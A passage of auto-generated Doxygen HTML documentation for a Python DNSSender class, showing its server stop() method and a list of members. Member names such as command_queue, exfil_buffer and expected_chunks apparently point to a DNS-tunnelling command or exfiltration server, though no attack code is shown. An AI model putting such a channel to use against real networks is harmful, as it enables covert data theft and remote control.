<div class="line"><span class="lineno">   46</span>        )</div>
<div class="line"><span class="lineno">   47</span>    </div>
<div class="line"><span class="lineno">   48</span>        self._thread.start()</div>
<div class="line"><span class="lineno">   49</span>        self._running = <span class="keyword">True</span></div>
<div class="line"><span class="lineno">   50</span> </div>
<div class="line"><span class="lineno">   51</span>        print(f<span class="stringliteral">&quot;[DNS SERVER] Listening on UDP/{cfg.DNS_PORT} for domain {cfg.DNS_DOMAIN}&quot;</span>)</div>
<div class="line"><span class="lineno">   52</span>    </div>
</div><!-- fragment -->
</div>
</div>
<a id="af47089b4649a9a45e0d1c2e87d695689" name="af47089b4649a9a45e0d1c2e87d695689"></a>
<h2 class="memtitle"><span class="permalink"><a href="#af47089b4649a9a45e0d1c2e87d695689">&#9670;&#160;</a></span>stop()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname"> None stop </td>
          <td>(</td>
          <td class="paramtype">&#160;</td>
          <td class="paramname"><em>self</em></td><td>)</td>
          <td></td>
        </tr>
      </table>
</div><div class="memdoc">
<pre class="fragment">Stops the DNS server. This calls shutdown() on the ThreadingUDPServer, then
server_close() to close the socket. After this returns, no new DNS queries will
be handled, and the background thread will exit.
</pre> 
<p class="definition">Definition at line <a class="el" href="../../d5/d08/DNSSender_8py_source.html#l00053">53</a> of file <a class="el" href="../../d5/d08/DNSSender_8py_source.html">DNSSender.py</a>.</p>
<div class="fragment"><div class="line"><span class="lineno">   53</span>    <span class="keyword">def </span>stop(self) -&gt; None:</div>
<div class="line"><span class="lineno">   54</span>        <span class="stringliteral">&quot;&quot;&quot;</span></div>
<div class="line"><span class="lineno">   55</span><span class="stringliteral">        Stops the DNS server. This calls shutdown() on the ThreadingUDPServer, then</span></div>
<div class="line"><span class="lineno">   56</span><span class="stringliteral">        server_close() to close the socket. After this returns, no new DNS queries will</span></div>
<div class="line"><span class="lineno">   57</span><span class="stringliteral">        be handled, and the background thread will exit.</span></div>
<div class="line"><span class="lineno">   58</span><span class="stringliteral">        &quot;&quot;&quot;</span></div>
<div class="line"><span class="lineno">   59</span>        <span class="keywordflow">if</span> <span class="keywordflow">not</span> self._running <span class="keywordflow">or</span> self._server <span class="keywordflow">is</span> <span class="keywordtype">None</span>:</div>
<div class="line"><span class="lineno">   60</span>            print(<span class="stringliteral">&quot;[DNS SERVER] Server is not running, so nothing to stop.&quot;</span>)</div>
<div class="line"><span class="lineno">   61</span>            <span class="keywordflow">return</span></div>
<div class="line"><span class="lineno">   62</span> </div>
<div class="line"><span class="lineno">   63</span>        self._server.shutdown()</div>
<div class="line"><span class="lineno">   64</span>        self._server.server_close()</div>
<div class="line"><span class="lineno">   65</span> </div>
<div class="line"><span class="lineno">   66</span>        self._running = <span class="keyword">False</span></div>
<div class="line"><span class="lineno">   67</span>        self._server = <span class="keywordtype">None</span></div>
<div class="line"><span class="lineno">   68</span>        self._thread = <span class="keywordtype">None</span></div>
<div class="line"><span class="lineno">   69</span> </div>
<div class="line"><span class="lineno">   70</span>        print(<span class="stringliteral">&quot;[DNS SERVER] Server stopped.&quot;</span>)</div>
<div class="line"><span class="lineno">   71</span> </div>
</div><!-- fragment -->
</div>
</div>
<h2 class="groupheader">Member Data Documentation</h2>
<a id="a199fe9bca674a3f92e800a6eb2f0712a" name="a199fe9bca674a3f92e800a6eb2f0712a"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a199fe9bca674a3f92e800a6eb2f0712a">&#9670;&#160;</a></span>_crypto</h2>

<div class="memitem">
<div class="memproto">
<table class="mlabels">
  <tr>
  <td class="mlabels-left">
      <table class="memname">
        <tr>
          <td class="memname">_crypto</td>
        </tr>
      </table>
  </td>
  <td class="mlabels-right">
<span class="mlabels"><span class="mlabel">protected</span></span>  </td>
  </tr>
</table>
</div><div class="memdoc">

<p class="definition">Definition at line <a class="el" href="../../d5/d08/DNSSender_8py_source.html#l00027">27</a> of file <a class="el" href="../../d5/d08/DNSSender_8py_source.html">DNSSender.py</a>.</p>

</div>
</div>
<a id="a97a1a75ef11a4e52741a9fb7d366f56b" name="a97a1a75ef11a4e52741a9fb7d366f56b"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a97a1a75ef11a4e52741a9fb7d366f56b">&#9670;&#160;</a></span>_running</h2>

<div class="memitem">
<div class="memproto">
<table class="mlabels">
  <tr>
  <td class="mlabels-left">
      <table class="memname">
        <tr>
          <td class="memname">_running</td>
        </tr>
      </table>
  </td>
  <td class="mlabels-right">
<span class="mlabels"><span class="mlabel">protected</span></span>  </td>
  </tr>
</table>
</div><div class="memdoc">

<p class="definition">Definition at line <a class="el" href="../../d5/d08/DNSSender_8py_source.html#l00022">22</a> of file <a class="el" href="../../d5/d08/DNSSender_8py_source.html">DNSSender.py</a>.</p>

</div>
</div>
<a id="a918fd5a7f89e9729812a35eff09f3f74" name="a918fd5a7f89e9729812a35eff09f3f74"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a918fd5a7f89e9729812a35eff09f3f74">&#9670;&#160;</a></span>_server</h2>

<div class="memitem">
<div class="memproto">
<table class="mlabels">
  <tr>
  <td class="mlabels-left">
      <table class="memname">
        <tr>
          <td class="memname">_server</td>
        </tr>
      </table>
  </td>
  <td class="mlabels-right">
<span class="mlabels"><span class="mlabel">protected</span></span>  </td>
  </tr>
</table>
</div><div class="memdoc">

<p class="definition">Definition at line <a class="el" href="../../d5/d08/DNSSender_8py_source.html#l00024">24</a> of file <a class="el" href="../../d5/d08/DNSSender_8py_source.html">DNSSender.py</a>.</p>

</div>
</div>
<a id="a1651625c88209f521cb5a16c226eec58" name="a1651625c88209f521cb5a16c226eec58"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a1651625c88209f521cb5a16c226eec58">&#9670;&#160;</a></span>_thread</h2>

<div class="memitem">
<div class="memproto">
<table class="mlabels">
  <tr>
  <td class="mlabels-left">
      <table class="memname">
        <tr>
          <td class="memname">_thread</td>
        </tr>
      </table>
  </td>
  <td class="mlabels-right">
<span class="mlabels"><span class="mlabel">protected</span></span>  </td>
  </tr>
</table>
</div><div class="memdoc">

<p class="definition">Definition at line <a class="el" href="../../d5/d08/DNSSender_8py_source.html#l00025">25</a> of file <a class="el" href="../../d5/d08/DNSSender_8py_source.html">DNSSender.py</a>.</p>

</div>
</div>
<a id="ad997db1bc5aec8948b780cd64f9fda71" name="ad997db1bc5aec8948b780cd64f9fda71"></a>
<h2 class="memtitle"><span class="permalink"><a href="#ad997db1bc5aec8948b780cd64f9fda71">&#9670;&#160;</a></span>command_queue</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">command_queue</td>
        </tr>
      </table>
</div><div class="memdoc">

<p class="definition">Definition at line <a class="el" href="../../d5/d08/DNSSender_8py_source.html#l00017">17</a> of file <a class="el" href="../../d5/d08/DNSSender_8py_source.html">DNSSender.py</a>.</p>

</div>
</div>
<a id="a35ffedec6e01508f4303ebadc26ce456" name="a35ffedec6e01508f4303ebadc26ce456"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a35ffedec6e01508f4303ebadc26ce456">&#9670;&#160;</a></span>exfil_buffer</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">exfil_buffer</td>
        </tr>
      </table>
</div><div class="memdoc">

<p class="definition">Definition at line <a class="el" href="../../d5/d08/DNSSender_8py_source.html#l00018">18</a> of file <a class="el" href="../../d5/d08/DNSSender_8py_source.html">DNSSender.py</a>.</p>

</div>
</div>
<a id="a93c988ce4a7789d162639e8f72c112cb" name="a93c988ce4a7789d162639e8f72c112cb"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a93c988ce4a7789d162639e8f72c112cb">&#9670;&#160;</a></span>expected_chunks</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">expected_chunks</td>
        </tr>
      </table>
</div><div class="memdoc">

<p class="definition">Definition at line <a class="el" href="../../d5/d08/DNSSender_8py_source.html#l00019">19</a> of file <a class="el" href="../../d5/d08/DNSSender_8py_source.html">DNSSender.py</a>.</p>

</div>
</div>
<a id="aee6e0cd65a787643e49e447538a62770" name="aee6e0cd65a787643e49e447538a62770"></a>
<h2 class="memtitle"><span class="permalink"><a href="#aee6e0cd65a787643e49e447538a62770">&#9670;&#160;</a></span>owner</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">owner</td>
        </tr>
      </table>
</div><div class="memdoc">

<p class="definition">Definition at line <a class="el" href="../../d5/d08/DNSSender_8py_source.html#l00021">21</a> of file <a class="el" href="../../d5/d08/DNSSender_8py_source.html">DNSSender.py</a>.</p>

</div>
</div>
<hr/>The documentation for this class was generated from the following file:<ul>
<li><a class="el" href="../../d5/d08/DNSSender_8py_source.html">DNSSender.py</a></li>
</ul>
</div><!-- contents -->
</div><!-- doc-content -->

<div id="nav-path" class="navpath"><!-- id is needed for treeview function! --></div>
</body>
</html>
